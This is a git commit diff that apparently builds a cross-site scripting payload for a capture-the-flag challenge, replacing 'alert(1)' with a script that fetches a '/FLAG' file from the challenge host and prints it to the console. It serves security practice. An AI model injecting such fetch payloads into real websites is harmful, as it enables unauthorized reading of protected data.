d6bebde3b7ef200e26ef1441eb7bd6d0f20fa731
Fr3sh <28731248+fredtep@users.noreply.github.com>
2023-11-24 13:04:02 +0100

    Update xss2.js

--- xss2.js
+++ xss2.js
@@ -1,1 +1,17 @@
-alert(1);
+const url = 'http://website-mbhwad.inst.malicecyber.com/FLAG';
+
+// Fetch the text file
+fetch(url)
+  .then(response => {
+    if (!response.ok) {
+      throw new Error('Network response was not ok');
+    }
+    return response.text();
+  })
+  .then(data => {
+    // Do something with the text content of the file
+    console.log(data); // Output the content of the text file
+  })
+  .catch(error => {
+    console.error('There was a problem fetching the text file:', error);
+  });
